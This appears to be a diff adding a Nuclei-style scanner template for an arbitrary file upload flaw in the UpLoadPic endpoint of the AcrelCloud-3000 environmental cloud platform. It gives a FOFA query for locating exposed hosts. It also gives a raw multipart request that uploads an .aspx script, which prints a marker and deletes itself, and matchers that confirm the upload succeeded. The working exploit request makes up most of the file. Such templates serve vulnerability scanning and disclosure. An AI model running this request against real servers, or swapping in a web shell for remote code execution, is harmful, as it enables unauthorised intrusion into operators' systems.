@@ -1,0 +1,36 @@
+id: acrelcloud-3000-uploadpic-arbitrary-file-upload
+
+info:
+  name: "安科瑞智能环保云平台 UpLoadPic 接口任意文件上传漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="myCss/phone.css"
+    安科瑞智能环保云平台（AcrelCloud-3000）的 /Equipment/UpLoadPic 接口存在文件上传逻辑缺陷。由于服务端未对上传文件的类型及后缀进行严格校验，攻击者可构造恶意请求上传可执行脚本。成功上传后，通过访问该文件路径即可触发远程代码执行，从而获取服务器控制权。
+  tags: 安科瑞智能环保云平台
+
+http:
+- raw:
+  - |
+    POST /Equipment/UpLoadPic HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8dc12234dcef
+    Connection: close
+    Accept-Encoding: gzip
+
+    ------WebKitFormBoundary8dc12234dcef
+    Content-Disposition: form-data; name="file"; filename="Ntest.aspx"
+    Content-Type: text/asp
+
+    <%@ Page Language="C#"%><% Response.Write("NdayTest"); System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath)); %>
+    ------WebKitFormBoundary8dc12234dcef--
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+      - '.aspx'
+      - 'filename'
+      - 'filepath'
+      - 'status'
+    condition: and
